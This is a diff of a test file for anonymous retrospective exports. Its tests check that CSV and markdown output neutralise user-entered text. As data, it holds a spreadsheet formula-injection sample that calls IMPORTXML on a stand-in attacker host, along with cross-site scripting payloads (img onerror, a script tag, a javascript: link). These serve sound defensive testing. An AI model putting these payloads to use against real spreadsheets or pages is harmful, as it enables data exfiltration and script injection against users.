@@ -35,7 +35,12 @@ function makeExportState(): RoomState {
       { participantId: "p2", target: groupVoteTarget("group-1"), count: 1 },
       { participantId: "p2", target: itemVoteTarget("item-2"), count: 1 },
     ],
+    rankingMethod: "score",
+    pairwiseChoices: [],
+    pairwiseProgress: [],
+    reviewTargetKey: null,
     actions: [{ id: "action-1", text: "Alice to create launch checklist", authorId: "fac1", order: 0 }],
+    reactions: [],
     timer: { startedAt: null, durationSeconds: null, expired: false },
     voteBudget: 5,
     version: 12,
@@ -76,5 +81,25 @@ describe("anonymous retro exports", () => {
       { id: "action-2", text: "+SUM(1,2)", order: 1 },
       { id: "action-3", text: "@cmd", order: 2 },
     ])).toBe("order,text\n1,\"'=IMPORTXML(\"\"https://attacker.example\"\")\"\n2,\"'+SUM(1,2)\"\n3,'@cmd\n");
+  });
+
+  it("escapes user-controlled markdown export text as inert content", () => {
+    const exportData = buildAnonymousRetroExport({
+      ...makeExportState(),
+      columns: [{ id: "col-1", name: "Bad <img src=x onerror=alert(1)>", order: 0 }],
+      groups: [{ id: "group-1", name: "Group [link](javascript:alert(1))", columnId: "col-1", order: 0 }],
+      items: [
+        { id: "item-1", text: "- injected\n<script>alert(1)</script>", authorId: "fac1", columnId: "col-1", groupId: "group-1", order: 0 },
+      ],
+      actions: [{ id: "action-1", text: "<img src=x onerror=alert(1)>", authorId: "p2", order: 0 }],
+    }, "2026-05-01T12:00:00.000Z");
+
+    const retroMarkdown = formatRetroExportMarkdown(exportData);
+    const actionMarkdown = formatActionsMarkdown(exportData.actions);
+    expect(retroMarkdown).not.toContain("<img");
+    expect(retroMarkdown).not.toContain("<script>");
+    expect(retroMarkdown).not.toContain("[link](javascript:");
+    expect(retroMarkdown).toContain("&lt;script&gt;alert\\(1\\)&lt;/script&gt;");
+    expect(actionMarkdown).toBe("- [ ] &lt;img src=x onerror=alert\\(1\\)&gt;\n");
   });
 });
